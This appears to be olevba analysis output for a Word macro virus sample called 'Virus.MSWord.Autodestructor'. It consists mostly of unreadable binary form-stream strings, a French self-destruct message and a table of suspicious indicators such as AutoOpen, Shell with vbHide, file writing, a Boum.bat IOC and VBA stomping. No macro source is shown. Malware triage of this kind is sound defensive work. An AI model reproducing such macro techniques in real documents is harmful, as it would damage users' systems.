-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ϒ5���k<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
΀��,�iH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��L�����f;;�N��+u��:���Ď_5�-�n{���6[�ƽ�C	�ԸL7���drk�ݞ�����Xv�M8��6!=ln@۵�������G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@u�&��Duñ���u�0>�M��Q�x���=�躓̼�t#QNr2�6�%����;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;X�ڼ�(�����Z&�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ҳ�#ej%r�VH�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kw�Ŭ-�3�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����5}�a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%�Z�_�o׺}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
С���xW_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䴗�U�����ݫwO����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q4}�����>w�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�ѻ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�ui~@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>��:�?�y���gH��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}���|�s���x}�M>/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���m���_"���q�:���D?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�.؇�������^�PI���E~�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q.j�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�%#�ac�y�#BI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
||�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��<�6��Q��'z�7(}������vy$�#!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vlā�т
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��WQrT��'�?�i:X|<�[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ua��G�DX�Ah{ܗ�׷�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�v7���7�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�\hwU�iaH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y`X�y�t9��%(wi��.)(���1v8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�h���#��LӈXx:�ȅ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8������t����D����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8��X��x�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cliquez ici
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Votre ordinateur vient de s'autod�truire....�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Boum.bat            |Executable file name                         |
|Hex String|33?3                |33333f33                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

